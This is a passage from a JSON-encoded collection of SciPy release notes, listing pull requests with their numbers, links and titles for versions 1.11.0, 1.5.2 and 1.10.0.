<https://github.com/scipy/scipy/pull/18510>`__: TST: Add regression tests for sparse creation functions.\n* `18513 <https://github.com/scipy/scipy/pull/18513>`__: MAINT: sparse: cosmetic updates + typing for sputils\n* `18516 <https://github.com/scipy/scipy/pull/18516>`__: DOC: add user guide page introing new sparse arrays\n* `18522 <https://github.com/scipy/scipy/pull/18522>`__: Pin prerelease pipeline with Cython>=3.0.0b3\n* `18523 <https://github.com/scipy/scipy/pull/18523>`__: TST: piecemeal updates to \\`test_base.py\\` for sparray conversion\n* `18526 <https://github.com/scipy/scipy/pull/18526>`__: DOC: Fix broken reference to count_nonzero in See Also.\n* `18527 <https://github.com/scipy/scipy/pull/18527>`__: try stable sort in mst tree ordering\n* `18528 <https://github.com/scipy/scipy/pull/18528>`__: ENH: Update isspmatrix behavior\n* `18531 <https://github.com/scipy/scipy/pull/18531>`__: Class names to enable isinstance\n* `18532 <https://github.com/scipy/scipy/pull/18532>`__: Fix format property in _csr.py\n* `18536 <https://github.com/scipy/scipy/pull/18536>`__: Add deprecation notices to sparse array docs\n* `18538 <https://github.com/scipy/scipy/pull/18538>`__: ENH: sparse: Add _array version of \\`diags\\` creation functions.\n* `18539 <https://github.com/scipy/scipy/pull/18539>`__: DOC: sparse: Document sparse canonical formats\n* `18540 <https://github.com/scipy/scipy/pull/18540>`__: MAINT: sparse: Deprecate multi-Ellipsis indexing\n* `18542 <https://github.com/scipy/scipy/pull/18542>`__: ENH: sparse: add nanmin/nanmax (followup on gh-8902)\n* `18543 <https://github.com/scipy/scipy/pull/18543>`__: MAINT: optimize.root_scalar: ensure that root is a scalar\n* `18545 <https://github.com/scipy/scipy/pull/18545>`__: TST: speed up \\`test_import_cycles\\`\n* `18549 <https://github.com/scipy/scipy/pull/18549>`__: TST: optimize: filter RuntimeWarning that does not indicate test...\n* `18550 <https://github.com/scipy/scipy/pull/18550>`__: DOC: optimize.OptimizeResult: note that not all listed attributes...\n* `18551 <https://github.com/scipy/scipy/pull/18551>`__: Replace sparse __getattr__ with properties\n* `18553 <https://github.com/scipy/scipy/pull/18553>`__: BENCH: sparse: Add a benchmark for sparse matrix power\n* `18554 <https://github.com/scipy/scipy/pull/18554>`__: BUG: sparse: Fix DIA.tocoo canonical format setting\n* `18556 <https://github.com/scipy/scipy/pull/18556>`__: MAINT: io: replace isspmatrix with issparse in mmio module\n* `18560 <https://github.com/scipy/scipy/pull/18560>`__: MAINT: integrate: revert\\`full_output\\` deprecation / result...\n* `18562 <https://github.com/scipy/scipy/pull/18562>`__: fix doc strings for csr_array and friends\n* `18563 <https://github.com/scipy/scipy/pull/18563>`__: DOC: SciPy 1.11.0 release notes\n* `18591 <https://github.com/scipy/scipy/pull/18591>`__: MAINT: version bounds for 1.11.0rc1\n* `18596 <https://github.com/scipy/scipy/pull/18596>`__: DOC: Fix sidebar for API reference pages\n* `18598 <https://github.com/scipy/scipy/pull/18598>`__: CI: fix wheel upload to anaconda [wheel build]\n* `18599 <https://github.com/scipy/scipy/pull/18599>`__: Revert \"ENH: sparse: Add _array version of \\`diags\\` creation...\n* `18608 <https://github.com/scipy/scipy/pull/18608>`__: Fix typo of module name in deprecation warning\n* `18629 <https://github.com/scipy/scipy/pull/18629>`__: Mark \\`void\\` functions as \\`noexcept\\` in _rotation.pyx\n* `18630 <https://github.com/scipy/scipy/pull/18630>`__: MAINT: stats: remove long double support for all boost ufuncs\n* `18636 <https://github.com/scipy/scipy/pull/18636>`__: MAINT: stats.truncnorm/stats.betaprime: fix _munp for higher...\n* `18657 <https://github.com/scipy/scipy/pull/18657>`__: MAINT: fix 'no such option' error in build_scipy CI\n* `18658 <https://github.com/scipy/scipy/pull/18658>`__: TST: fix two test failures that showed up on conda-forge\n* `18659 <https://github.com/scipy/scipy/pull/18659>`__: DOC: \\`scipy._sensitivity_analysis\\`: correct statement about...\n* `18671 <https://github.com/scipy/scipy/pull/18671>`__: MAINT: backports for 1.11.0rc2\n* `18672 <https://github.com/scipy/scipy/pull/18672>`__: BUG: small shim for release process\n* `18676 <https://github.com/scipy/scipy/pull/18676>`__: BUG: signal: fix detrend with array-like bp\n* `18697 <https://github.com/scipy/scipy/pull/18697>`__: MAINT: NumPy 1.25.0 shims for arm64\n* `18698 <https://github.com/scipy/scipy/pull/18698>`__: DEP: interpolate: delay interp2d deprecation and update link\n* `18724 <https://github.com/scipy/scipy/pull/18724>`__: MAINT, REL: prepare for SciPy 1.11.0 \"final\"\n* `18737 <https://github.com/scipy/scipy/pull/18737>`__: TST: flaky TestSOSFreqz::test_fs_param\n* `18738 <https://github.com/scipy/scipy/pull/18738>`__: TST: flaky \\`test_complex_iir_dlti\\`\n\n\n==========================\n", "1.5.2": "-----------------------\n\n* `12156 <https://github.com/scipy/scipy/pull/12156>`__: BUG: Fix permutation of distance matrices in scipy.stats.multiscale_graphcorr\n* `12238 <https://github.com/scipy/scipy/pull/12238>`__: BUG: Use 64-bit indexing in convolve2d to avoid overflow\n* `12256 <https://github.com/scipy/scipy/pull/12256>`__: BLD: Build lsap as a single extension instead of extension +...\n* `12320 <https://github.com/scipy/scipy/pull/12320>`__: BUG: spatial: avoid returning negative correlation distance\n* `12383 <https://github.com/scipy/scipy/pull/12383>`__: ENH: Make cKDTree.tree more efficient\n* `12392 <https://github.com/scipy/scipy/pull/12392>`__: DOC: update scipy-sphinx-theme\n* `12430 <https://github.com/scipy/scipy/pull/12430>`__: BUG: truncnorm and geninvgauss never return scalars from rvs\n* `12437 <https://github.com/scipy/scipy/pull/12437>`__: BUG: optimize: cast bounds to floats in new_bounds_to_old/old_bounds_to_new\n* `12442 <https://github.com/scipy/scipy/pull/12442>`__: MAINT:linalg: Fix for input args of eigvalsh\n* `12461 <https://github.com/scipy/scipy/pull/12461>`__: MAINT: sparse: write matrix/asmatrix wrappers without warning...\n* `12478 <https://github.com/scipy/scipy/pull/12478>`__: BUG: fix array_like input defects and add tests for all functions...\n* `12488 <https://github.com/scipy/scipy/pull/12488>`__: BUG: fix approx_derivative step size. Closes #12487\n* `12500 <https://github.com/scipy/scipy/pull/12500>`__: CI: actions branch trigger fix\n* `12501 <https://github.com/scipy/scipy/pull/12501>`__: CI: actions branch trigger fix\n* `12504 <https://github.com/scipy/scipy/pull/12504>`__: BUG: cKDTreeNode use after free\n* `12529 <https://github.com/scipy/scipy/pull/12529>`__: MAINT: allow graceful docs re-upload\n* `12538 <https://github.com/scipy/scipy/pull/12538>`__: BUG:linalg: eigh type parameter handling corrected\n* `12560 <https://github.com/scipy/scipy/pull/12560>`__: MAINT: truncnorm.rvs compatibility for \\`Generator\\`\n* `12562 <https://github.com/scipy/scipy/pull/12562>`__: redo gh-12188: fix segfaults in splprep with fixed knots\n* `12586 <https://github.com/scipy/scipy/pull/12586>`__: BLD: Add -std=c99 to sigtools to compile with C99\n* `12590 <https://github.com/scipy/scipy/pull/12590>`__: CI: Add GCC 4.8 entry to travis build matrix\n* `12591 <https://github.com/scipy/scipy/pull/12591>`__: BLD: fix cython error on master-branch cython\n\n\n==========================\n", "1.10.0": "************************\n\n* `9072 <https://github.com/scipy/scipy/pull/9072>`__: ENH: Added rectangular integral to multivariate_normal\n* `9932 <https://github.com/scipy/scipy/pull/9932>`__: ENH: stats.gaussian_kde: add method that returns marginal distribution\n* `11712 <https://github.com/scipy/scipy/pull/11712>`__: BUG: trust-constr evaluates function out of bounds\n* `12211 <https://github.com/scipy/scipy/pull/12211>`__: DOC: Dice similiarity index\n* `12312 <https://github.com/scipy/scipy/pull/12312>`__: ENH: Accelerate matrix normal sampling using matmul\n* `12594 <https://github.com/scipy/scipy/pull/12594>`__: BUG: fixed indexing error when using bounds in Powell's method...\n* `13053 <https://github.com/scipy/scipy/pull/13053>`__: ENH: add MLE for stats.powerlaw.fit\n* `13265 <https://github.com/scipy/scipy/pull/13265>`__: ENH: Kstest exact performance improvements\n* `13340 <https://github.com/scipy/scipy/pull/13340>`__: ENH: stats: Add the function odds_ratio.\n* `13663 <https://github.com/scipy/scipy/pull/13663>`__: ENH: linalg: Add LAPACK wrappers for trexc and trsen.\n* `13753 <https://github.com/scipy/scipy/pull/13753>`__: DOC: optimize: update Powell docs to reflect API\n* `13957 <https://github.com/scipy/scipy/pull/13957>`__: ENH: stats.ks_2samp: Pythranize remaining exact p-value calculations\n* `14248 <https://github.com/scipy/scipy/pull/14248>`__: MAINT:linalg: Make lu_factor accept rectangular arrays\n* `14317 <https://github.com/scipy/scipy/pull/14317>`__: ENH: Optimize sparse frobenius norm\n* `14402 <https://github.com/scipy/scipy/pull/14402>`__: DOC: Clarify argument documentation for \\`solve\\`\n* `14430 <https://github.com/scipy/scipy/pull/14430>`__: ENH: improve siegelslopes via pythran\n* `14563 <https://github.com/scipy/scipy/pull/14563>`__: WIP: stats: bins=auto in docstrings\n* `14579 <https://github.com/scipy/scipy/pull/14579>`__: BENCH: optimize: add DFO CUTEST benchmark\n* `14638 <https://github.com/scipy/scipy/pull/14638>`__: DOC: added mention of the limitations of Thomas' algorithm\n* `14840 <https://github.com/scipy/scipy/pull/14840>`__: ENH: Addition of Poisson Means Test (E-test).\n* `15097 <https://github.com/scipy/scipy/pull/15097>`__: ENH: add radius to gaussian_filter1d and gaussian_filter\n* `15444 <https://github.com/scipy/scipy/pull/15444>`__: ENH: Infinite df approximation for Studentized Range PDF\n* `15493 <https://github.com/scipy/scipy/pull/15493>`__: ENH: Convert gaussian_kde logpdf to Cython\n* `15607 <https://github.com/scipy/scipy/pull/15607>`__: ENH: Add \\`scipy.datasets\\` submodule\n* `15709 <https://github.com/scipy/scipy/pull/15709>`__: ENH: improve the computation time of stats.cramervonmises_2samp()\n* `15770 <https://github.com/scipy/scipy/pull/15770>`__: ENH: stats: replace ncx2 stats distribution with Boost non_central_chi_squared\n* `15878 <https://github.com/scipy/scipy/pull/15878>`__: DEP: remove local_search_options of dual_annealing\n* `15892 <https://github.com/scipy/scipy/pull/15892>`__: BUG: stats: use mean behavior for percentileofscore in bootstrap\n* `15901 <https://github.com/scipy/scipy/pull/15901>`__: DEP: Deprecate scipy.misc in favour of scipy.datasets\n* `15967 <https://github.com/scipy/scipy/pull/15967>`__: TST/DOC: stats: explain/check 100% interval for discrete distributions\n* `15972 <https://github.com/scipy/scipy/pull/15972>`__: DOC: length of \\`bands\\` param. specified in \\`firls\\`\n* `16002 <https://github.com/scipy/scipy/pull/16002>`__: ENH: Allow specyfing inverse covariance of a multivariate normal...\n* `16017 <https://github.com/scipy/scipy/pull/16017>`__: ENH: special: Use boost for a couple ufuncs.\n* `16069 <https://github.com/scipy/scipy/pull/16069>`__: ENH: add additional MLE for fixed parameters in gumbel_r.fit\n* `16096 <https://github.com/scipy/scipy/pull/16096>`__: BUG: use SOS filters in decimate for numerical stability\n* `16109 <https://github.com/scipy/scipy/pull/16109>`__: ENH: add \\`optimization\\` to \\`QMCEngine\\`\n* `16140 <https://github.com/scipy/scipy/pull/16140>`__: ENH: stats: Add \\`nan_policy\\` optional argument for \\`stats.rankdata\\`\n* `16224 <https://github.com/scipy/scipy/pull/16224>`__: Add a \\`pchip\\` mode to RegularGridInterpolator.\n* `16227 <https://github.com/scipy/scipy/pull/16227>`__: BUG: special: Fix a couple issues with the 'double-double' code...\n* `16238 <https://github.com/scipy/scipy/pull/16238>`__: MAINT: stats: support string array for _contains_nan and add...\n* `16268 <https://github.com/scipy/scipy/pull/16268>`__: DOC: optimize: add marginals/slack example to \\`linprog\\`\n* `16294 <https://github.com/scipy/scipy/pull/16294>`__: BUG: linalg: Add precision preservation for \\`sqrtm\\`\n* `16298 <https://github.com/scipy/scipy/pull/16298>`__: REL: set version to 1.10.0.dev0\n* `16299 <https://github.com/scipy/scipy/pull/16299>`__: DEP: Execute deprecation of scipy.linalg.blas.{clapack, flapack}\n* `16307 <https://github.com/scipy/scipy/pull/16307>`__: DEP: add deprecation warning for binom_test\n* `16315 <https://github.com/scipy/scipy/pull/16315>`__: DEP: add deprecation warning for kwargs nyq / Hz in firwin\n* `16317 <https://github.com/scipy/scipy/pull/16317>`__: ENH: stats: add truncated (i.e. upper bounded) Pareto distribution...\n* `16320 <https://github.com/scipy/scipy/pull/16320>`__: ENH: improved accuracy and orthonormality of output eigenvectors...\n* `16327 <https://github.com/scipy/scipy/pull/16327>`__: DOC: BLD: remove \\`-scipyopt\\` from html Make command and build...\n* `16328 <https://github.com/scipy/scipy/pull/16328>`__: MAINT: retry openblas download in CI\n* `16332 <https://github.com/scipy/scipy/pull/16332>`__: BLD: ensure we get understandable messages when git submodules...\n* `16335 <https://github.com/scipy/scipy/pull/16335>`__: BLD: update NumPy to >=1.19.5\n* `16336 <https://github.com/scipy/scipy/pull/16336>`__: MAINT: forward port git scoping\n* `16340 <https://github.com/scipy/scipy/pull/16340>`__: DEP: remove tol & max_intervals from NumericalInverseHermite\n* `16346 <https://github.com/scipy/scipy/pull/16346>`__: DEV: add meson-python to environment.yml\n* `16351 <https://github.com/scipy/scipy/pull/16351>`__: Added \"import numpy as np\" statement to filter examples\n* `16354 <https://github.com/scipy/scipy/pull/16354>`__: DOC: optimize: remove callback doc from the options in \\`_minimize_lbfgsb\\`...\n* `16355 <https://github.com/scipy/scipy/pull/16355>`__: DEP: add deprecation warnings to kwargs turbo / eigvals of linalg.eigh\n* `16356 <https://github.com/scipy/scipy/pull/16356>`__: DOC: add examples to \\`signal.medfilt2d\\`\n* `16357 <https://github.com/scipy/scipy/pull/16357>`__: BENCH: Add SHGO and DIRECT to optimization benchmark\n* `16362 <https://github.com/scipy/scipy/pull/16362>`__: ENH: Provide more information when a value is out of bounds in...\n* `16367 <https://github.com/scipy/scipy/pull/16367>`__: BUG: unclear error for invalid bracketing\n* `16371 <https://github.com/scipy/scipy/pull/16371>`__: MAINT: remove last (already safe) usage of \\`mktemp\\`\n* `16372 <https://github.com/scipy/scipy/pull/16372>`__: MAINT: rename \\`do.py\\` to \\`dev.py\\`\n* `16373 <https://github.com/scipy/scipy/pull/16373>`__: DOC: added rvalue description in \\`stats.probplot\\`\n* `16377 <https://github.com/scipy/scipy/pull/16377>`__: ENH: stats.bootstrap: update warning to mention np.min\n* `16383 <https://github.com/scipy/scipy/pull/16383>`__: BUG: fix error message of RegularGridInterpolator\n* `16387 <https://github.com/scipy/scipy/pull/16387>`__: ENH: stats.combine_pvalues: convert output tuple to Bunch\n* `16388 <https://github.com/scipy/scipy/pull/16388>`__: DEP: deprecate \\`stats.kendalltau\\` kwarg \\`initial_lexsort\\`\n* `16389 <https://github.com/scipy/scipy/pull/16389>`__: DEP: sharpen stats deprecations\n* `16392 <https://github.com/scipy/scipy/pull/16392>`__: DEP: add warning to \\`sparse.gmres\\` deprecated kwarg \\`restrt\\`\n* `16397 <https://github.com/scipy/scipy/pull/16397>`__: MAINT: fix two refcounting issues in \\`ndimage\\`\n* `16398 <https://github.com/scipy/scipy/pull/16398>`__: MAINT: Replace find_common_types\n* `16406 <https://github.com/scipy/scipy/pull/16406>`__: MAINT: stats.rankdata: change default to nan_policy='propagate'\n* `16407 <https://github.com/scipy/scipy/pull/16407>`__: ENH: stats.fisher_exact: convert output tuple to Bunch\n* `16411 <https://github.com/scipy/scipy/pull/16411>`__: MAINT: optimize.brute should coerce non-tuple args to tuple\n* `16415 <https://github.com/scipy/scipy/pull/16415>`__: DOC: stats: fix seed -> random_state in \\`rvs\\` docstring\n* `16423 <https://github.com/scipy/scipy/pull/16423>`__: MAINT: stats: not using nested TypeErrors in _contains_nan\n* `16424 <https://github.com/scipy/scipy/pull/16424>`__: MAINT: future-proof \\`stats.kde\\` for changes in numpy casting...\n* `16425 <https://github.com/scipy/scipy/pull/16425>`__: DOC: Procedure adjustment in file doc/source/dev/core-dev/releasing.rst.inc\n* `16428 <https://github.com/scipy/scipy/pull/16428>`__: MAINT: fix up \\`_sputils.get_index_dtype\\` for NEP 50 casting...\n* `16431 <https://github.com/scipy/scipy/pull/16431>`__: CI: fix Gitpod build after dev.py update to the new CLI\n* `16432 <https://github.com/scipy/scipy/pull/16432>`__: Docstring fixes in lobpcg.py\n* `16434 <https://github.com/scipy/scipy/pull/16434>`__: DOC: stats.mstats.sen_seasonal_slopes: add docstring\n* `16435 <https://github.com/scipy/scipy/pull/16435>`__: ENH: directional mean\n* `16438 <https://github.com/scipy/scipy/pull/16438>`__: MAINT: remove unused \\`DeprecatedImport\\`\n* `16439 <https://github.com/scipy/scipy/pull/16439>`__: ENH: stats.chi2_contingency: convert output tuple to Bunch\n* `16440 <https://github.com/scipy/scipy/pull/16440>`__: ENH: stats.median_test: convert output tuple to Bunch\n* `16441 <https://github.com/scipy/scipy/pull/16441>`__: ENH: stats.mood: convert output tuple to Bunch\n* `16442 <https://github.com/scipy/scipy/pull/16442>`__: MAINT: fix issues with Python scalar related casting behavior...\n* `16447 <https://github.com/scipy/scipy/pull/16447>`__: BLD: make it easier to build with AddressSanitizer\n* `16449 <https://github.com/scipy/scipy/pull/16449>`__: ENH: improve scipy.interpolate.RegularGridInterpolator performance\n* `16450 <https://github.com/scipy/scipy/pull/16450>`__: BUG: Fix CLI Help in light themes\n* `16454 <https://github.com/scipy/scipy/pull/16454>`__: ENH: stats.bootstrap: return bootstrap distribution\n* `16455 <https://github.com/scipy/scipy/pull/16455>`__: ENH: stats.bootstrap: add BCa method for multi-sample statistic\n* `16462 <https://github.com/scipy/scipy/pull/16462>`__: CI: Update Python 3.8-dbg job to ubuntu-20.04\n* `16463 <https://github.com/scipy/scipy/pull/16463>`__: ENH: stats.jarque_bera: add axis, nan_policy, masked array support\n* `16470 <https://github.com/scipy/scipy/pull/16470>`__: DOC: stats.spearmanr: add information about p-value calculation\n* `16471 <https://github.com/scipy/scipy/pull/16471>`__: MAINT: interpolate/RGI: only call \\`find_indices\\` when needed\n* `16474 <https://github.com/scipy/scipy/pull/16474>`__: DOC: Add more information to entropy docstring\n* `16475 <https://github.com/scipy/scipy/pull/16475>`__: BLD: build the f2py shared source file once and link to each...\n* `16481 <https://github.com/scipy/scipy/pull/16481>`__: BUG: Change (n+1) to n for correct jackknife calculation of hd...\n* `16486 <https://github.com/scipy/scipy/pull/16486>`__: DOC: special.entr: add context\n* `16487 <https://github.com/scipy/scipy/pull/16487>`__: MAINT: Improve test speed, add timeouts\n* `16496 <https://github.com/scipy/scipy/pull/16496>`__: add notes for x and y array sorted in decreasing order\n* `16497 <https://github.com/scipy/scipy/pull/16497>`__: DOC: special: Add 'Examples' section to spence docstring.\n* `16498 <https://github.com/scipy/scipy/pull/16498>`__: ENH: Speed up hdquantile_sd via cumulative sums\n* `16501 <https://github.com/scipy/scipy/pull/16501>`__: DOC: Fix typo in spatial.Delaunay\n* `16502 <https://github.com/scipy/scipy/pull/16502>`__: DOC: Minor Rst syntax update.\n* `16503 <https://github.com/scipy/scipy/pull/16503>`__: ENH: stats: Implement _munp() for the skewnorm distribution.\n* `16505 <https://github.com/scipy/scipy/pull/16505>`__: DOC: correct errs on examples for scipy.signal.upfirdn\n* `16508 <https://github.com/scipy/scipy/pull/16508>`__: BUG/ENH: handle spline interpolation methods in \\`interpn\\` and...\n* `16511 <https://github.com/scipy/scipy/pull/16511>`__: add reference to regulargridinterpolator\n* `16513 <https://github.com/scipy/scipy/pull/16513>`__: MAINT: skip complex128 propack tests on windows (& module clean-up)\n* `16516 <https://github.com/scipy/scipy/pull/16516>`__: DOC: add a hint on what to use in case of matlab v7.3\n* `16518 <https://github.com/scipy/scipy/pull/16518>`__: CI: pip and conda caching in all workflows\n* `16524 <https://github.com/scipy/scipy/pull/16524>`__: TST: stats.permutation_test: strengthen test against \\`ks_2samp\\`\n* `16529 <https://github.com/scipy/scipy/pull/16529>`__: CI: clean up scikit-umfpack and scikit-sparse usage in CI\n* `16532 <https://github.com/scipy/scipy/pull/16532>`__: Deprecated imports in docstring examples in \\`io.harwell_boeing\\`...\n* `16533 <https://github.com/scipy/scipy/pull/16533>`__: ENH: signal: add Lanczos window function\n* `16534 <https://github.com/scipy/scipy/pull/16534>`__: CI: fix scikit-umfpack and scikit-sparse install in Azure job\n* `16535 <https://github.com/scipy/scipy/pull/16535>`__: MAINT: signal: Fix matplotlib deprecation warning in the chirp...\n* `16543 <https://github.com/scipy/scipy/pull/16543>`__: DOC: update cwt doc examples\n* `16544 <https://github.com/scipy/scipy/pull/16544>`__: DOC: add better example for \\`MultinomialQMC\\`.\n* `16546 <https://github.com/scipy/scipy/pull/16546>`__: DOC: Add alt-text to tutorial images\n* `16547 <https://github.com/scipy/scipy/pull/16547>`__: ENH: correct bounds warnings in \\`minimize\\`\n* `16550 <https://github.com/scipy/scipy/pull/16550>`__: TST: fix flaky sparse.linalg.exmp test\n* `16552 <https://github.com/scipy/scipy/pull/16552>`__: CI: test distro Python install on Ubuntu Jammy (22.04 LTS)\n* `16554 <https://github.com/scipy/scipy/pull/16554>`__: TST: add timeout to \\`test_kappa4_array_gh13582\\`\n* `16557 <https://github.com/scipy/scipy/pull/16557>`__: BUG: fix \\`interpolate.RegularGridInterpolator\\` \\`out_of_bounds\\`...\n* `16559 <https://github.com/scipy/scipy/pull/16559>`__: ENH: adding a logpdf function to von-mises distribution\n* `16560 <https://github.com/scipy/scipy/pull/16560>`__: vectorize ortho_group.rvs\n* `16561 <https://github.com/scipy/scipy/pull/16561>`__: DOC: optimize: Fix warning in differential_evolution docstring\n* `16565 <https://github.com/scipy/scipy/pull/16565>`__: [DOC] improper type syntax in basinhopping docstring.\n* `16566 <https://github.com/scipy/scipy/pull/16566>`__: fix window function doc string for Window length\n* `16567 <https://github.com/scipy/scipy/pull/16567>`__: DOC: Add note about inaccuracies in matrix functions\n* `16571 <https://github.com/scipy/scipy/pull/16571>`__: DOC: sparse.linalg: add references for UMFPACK.\n* `16574 <https://github.com/scipy/scipy/pull/16574>`__: ENH: vectorize along samples \\`stats.ortho_group.rvs\\` and \\`stats.unitary_group.rvs\\`\n* `16576 <https://github.com/scipy/scipy/pull/16576>`__: testing documentation broken link fix\n* `16587 <https://github.com/scipy/scipy/pull/16587>`__: DOC: add import NumPy in QMC examples.\n* `16589 <https://github.com/scipy/scipy/pull/16589>`__: DOC: update toolchain.rst after EOL of manylinux_2_24; allow...\n* `16591 <https://github.com/scipy/scipy/pull/16591>`__: ENH: stats.nct: replace with boost implementation\n* `16592 <https://github.com/scipy/scipy/pull/16592>`__: DOC: interpolate: document the .roots() workaround\n* `16594 <https://github.com/scipy/scipy/pull/16594>`__: MAINT: Better pytest-timeout support\n* `16596 <https://github.com/scipy/scipy/pull/16596>`__: MAINT: stats.rv_continuous: consistently return NumPy scalars\n* `16607 <https://github.com/scipy/scipy/pull/16607>`__: MAINT: remove unnecessary \\`__future__\\` imports\n* `16608 <https://github.com/scipy/scipy/pull/16608>`__: TST: stats.rv_continuous: more direct test for numpy scalar output\n* `16612 <https://github.com/scipy/scipy/pull/16612>`__: ENH: vectorize along samples \\`stats.special_ortho_group.rvs\\`\n* `16614 <https://github.com/scipy/scipy/pull/16614>`__: DOC: add import NumPy in linalg decomposition function examples\n* `16615 <https://github.com/scipy/scipy/pull/16615>`__: DOC: Adding import numpy to several files\n* `16616 <https://github.com/scipy/scipy/pull/16616>`__: DOC: Adding import numpy to examples in some stats files\n* `16617 <https://github.com/scipy/scipy/pull/16617>`__: DOC: Update instructions for debugging using dev.py\n* `16618 <https://github.com/scipy/scipy/pull/16618>`__: DOC: add import NumPy in bsplines examples\n* `16619 <https://github.com/scipy/scipy/pull/16619>`__: DOC: add import numpy in some stats examples\n* `16620 <https://github.com/scipy/scipy/pull/16620>`__: DOC: Add numpy import to examples\n* `16621 <https://github.com/scipy/scipy/pull/16621>`__: FIX: upstream fix for binomial distribution divide-by-zero\n* `16624 <https://github.com/scipy/scipy/pull/16624>`__: DOC: add NumPy imports in \\`_mstats_basic.py\\` examples\n* `16625 <https://github.com/scipy/scipy/pull/16625>`__: DOC: add \\`import numpy as np\\` to examples\n* `16626 <https://github.com/scipy/scipy/pull/16626>`__: BUG: cluster: fix \\`leaves_color_list\\` issue\n* `16627 <https://github.com/scipy/scipy/pull/16627>`__: TST: spatial.directed_hausdorff: Parametrized test_random_state_None_int\n* `16629 <https://github.com/scipy/scipy/pull/16629>`__: DOC: Modifiy the scipy.stats.mode example to be nontrivial.\n* `16631 <https://github.com/scipy/scipy/pull/16631>`__: MAINT: stats.gaussian_kde: raise informative message with degenerate...\n* `16632 <https://github.com/scipy/scipy/pull/16632>`__: MAINT: signal:corrected peak_finding example\n* `16633 <https://github.com/scipy/scipy/pull/16633>`__: DOC: update benchmarking docs to use dev.py user interface\n* `16634 <https://github.com/scipy/scipy/pull/16634>`__: DOC: Add example to fft.fht\n* `16635 <https://github.com/scipy/scipy/pull/16635>`__: DOC: fix default_rng namespace and linestyle of an example\n* `16639 <https://github.com/scipy/scipy/pull/16639>`__: DOC: better links in readme for newcomers\n* `16640 <https://github.com/scipy/scipy/pull/16640>`__: MAINT: optimize: always return a float from goal functional wrapper\n* `16641 <https://github.com/scipy/scipy/pull/16641>`__: DOC: optimize: fix doc that \\`curve_fit\\` xdata should be float...\n* `16644 <https://github.com/scipy/scipy/pull/16644>`__: DOC: io: Add Examples section for mminfo, mmread and mmwrite.\n* `16646 <https://github.com/scipy/scipy/pull/16646>`__: MAINT: have get_index_dtype follow its documentation and return...\n* `16647 <https://github.com/scipy/scipy/pull/16647>`__: MAINT: Fix expit function name typo in test_optimize.py\n* `16650 <https://github.com/scipy/scipy/pull/16650>`__: DOC: io: Add 'Examples' to the 'whosmat' docstring.\n* `16651 <https://github.com/scipy/scipy/pull/16651>`__: ENH: stats.resampling: automatically detect whether statistic...\n* `16652 <https://github.com/scipy/scipy/pull/16652>`__: MAINT: Remove unused imports.\n* `16653 <https://github.com/scipy/scipy/pull/16653>`__: DEV: generalized cross-validation smoothing spline\n* `16654 <https://github.com/scipy/scipy/pull/16654>`__: ENH: stats: add aliases to results objects\n* `16658 <https://github.com/scipy/scipy/pull/16658>`__: BUG: signal: Compare window_length to correct axis in savgol_filter\n* `16659 <https://github.com/scipy/scipy/pull/16659>`__: DOC: replace \\`sphinx_panels\\` and \\`sphinx_tabs\\` with \\`sphinx_design\\`\n* `16666 <https://github.com/scipy/scipy/pull/16666>`__: MAINT: remove unused \\`__main__\\` code from \\`optimize\\` submodule\n* `16667 <https://github.com/scipy/scipy/pull/16667>`__: DOC: spatial: Correct barycentric description in Delaunay\n* `16668 <https://github.com/scipy/scipy/pull/16668>`__: DOC: signal: Update values in zpk2sos docstring examples.\n* `16670 <https://github.com/scipy/scipy/pull/16670>`__: MAINT: fix a compiler warning in \\`signal/_firfilter.c\\`\n* `16672 <https://github.com/scipy/scipy/pull/16672>`__: BLD: update minimum \\`meson\\` and \\`meson-python\\` versions\n* `16675 <https://github.com/scipy/scipy/pull/16675>`__: TST: sparse.linalg: increase \\`lobpcg\\` solve tolerance in test\n* `16676 <https://github.com/scipy/scipy/pull/16676>`__: MAINT: stats.mstats.mode: refactor to keep \\`kwargs\\` out of...\n* `16677 <https://github.com/scipy/scipy/pull/16677>`__: TST: speed up mindist test\n* `16678 <https://github.com/scipy/scipy/pull/16678>`__: DOC: remove custom colours in css\n* `16680 <https://github.com/scipy/scipy/pull/16680>`__: MAINT: stats.gmean: corrections with \\`axis=None\\` when masked-array...\n* `16683 <https://github.com/scipy/scipy/pull/16683>`__: DEV: add \\`--durations\\` argument to dev.py interface\n* `16685 <https://github.com/scipy/scipy/pull/16685>`__: BLD: implement compiler version checks for GCC and MSVC\n* `16687 <https://github.com/scipy/scipy/pull/16687>`__: DOC: signal: Update the examples in the remez docstring.\n* `16689 <https://github.com/scipy/scipy/pull/16689>`__: MAINT: sparse.linalg: remove LGMRES demo\n* `16690 <https://github.com/scipy/scipy/pull/16690>`__: random uniform -> normal to initiate lobpcg and arpack in svds\n* `16691 <https://github.com/scipy/scipy/pull/16691>`__: ENH: stats: Implement isf for the levy distribution.\n* `16692 <https://github.com/scipy/scipy/pull/16692>`__: ENH: stats.gaussian_kde: replace use of inv_cov in pdf\n* `16696 <https://github.com/scipy/scipy/pull/16696>`__: ENH: Speed up sparse.csgraph.dijkstra\n* `16699 <https://github.com/scipy/scipy/pull/16699>`__: DOC: stats: resampling and Monte Carlo methods tutorial\n* `16703 <https://github.com/scipy/scipy/pull/16703>`__: BLD: upgrade meson(-python) min versions and remove explicit...\n* `16704 <https://github.com/scipy/scipy/pull/16704>`__: DOC: improve some MSVC links in toolchain.rst\n* `16705 <https://github.com/scipy/scipy/pull/16705>`__: MAINT: add \\`__bool__\\` method to spatial.transform.Rotation\n* `16706 <https://github.com/scipy/scipy/pull/16706>`__: CI: add Meson version number in environment.yml to rebuild Docker...\n* `16707 <https://github.com/scipy/scipy/pull/16707>`__: DOC: expand the \\`scipy.interpolate\\` tutorial\n* `16712 <https://github.com/scipy/scipy/pull/16712>`__: BUG: Update _svds.py: orthogonalize eigenvectors from arpack...\n* `16714 <https://github.com/scipy/scipy/pull/16714>`__: ENH: stats.bootstrap: extend previous bootstrap result\n* `16715 <https://github.com/scipy/scipy/pull/16715>`__: DOC: interpolate: add an example of splPrep/PPoly.from_spline...\n* `16717 <https://github.com/scipy/scipy/pull/16717>`__: DOC: reformat seed docstrings\n* `16722 <https://github.com/scipy/scipy/pull/16722>`__: MAINT: additional test truthiness and length the empty Rotation\n* `16730 <https://github.com/scipy/scipy/pull/16730>`__: MAINT: interpolate: use _fitpack_impl in fitpack2\n* `16731 <https://github.com/scipy/scipy/pull/16731>`__: ENH: interpolate.KroghInterpolator: raise warning about numerical...\n* `16732 <https://github.com/scipy/scipy/pull/16732>`__: DOC: Replace runtests.py with dev.py where appropriate\n* `16733 <https://github.com/scipy/scipy/pull/16733>`__: DOC: Add link to development workflow\n* `16735 